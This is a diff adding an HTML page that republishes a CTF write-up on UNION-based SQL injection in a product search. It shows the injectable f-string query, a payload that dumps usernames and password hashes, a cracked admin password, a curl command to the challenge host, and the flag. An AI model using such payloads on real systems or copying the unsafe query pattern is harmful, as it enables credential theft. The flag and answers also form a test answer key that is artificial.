@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="The product search is UNION SQL injectable. We make the product list show the admin password hash, crack it, and use the ordinary admin login.">
+  <title>More than products | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 2 / MEDIUM</p>
+    <h1>More than products</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave2/sqli_union/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>The product search is UNION SQL injectable. We make the product list show the admin password hash, crack it, and use the ordinary admin login.</p>
+<h2>Root cause</h2>
+<p>The product search constructs SQL with the submitted query:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-python">q = request.args.get('q')
+query = f&quot;SELECT * FROM products WHERE name LIKE '%{q}%'&quot;
+cursor.execute(query)
+</code></pre>
+<p>The quote around q is part of the query string. A submitted quote terminates it, allowing <code>UNION SELECT</code> to append rows from another table. Parameterized SQL would make q data instead of SQL syntax.</p>
+<h2>Vulnerability</h2>
+<p>Searching with a quote affects the product list, showing that the search text changes an SQL query. The displayed product rows have four fields, so a UNION result must also provide four columns.</p>
+<h2>Exploit</h2>
+<p>Search for:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-sql">' UNION SELECT 1,username,password,1 FROM users-- -
+</code></pre>
+<p>The application displays the username and password fields as if they were a product name and description. This reveals the admin account and its MD5 password hash.</p>
+<p>Crack the hash with <code>Hashcat</code> mode 0, or just try in crackstation online. In the supplied deployment it resolves to:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">mofotrollop
+</code></pre>
+<p>Log in as admin with that password and visit <code>/admin.</code></p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-bash">curl -G --data-urlencode &quot;q=' UNION SELECT 1,username,password,1 FROM users-- -&quot; \
+  https://more-than-products.web2.friendly-ctf.securinets.tn/search
+</code></pre>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{uni0n_b4s3d_sql_inj3cti0n_4lways_funny}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave2">&larr; Back to Wave 2 writeups</a></p>
+  </main>
+</body>
+</html>
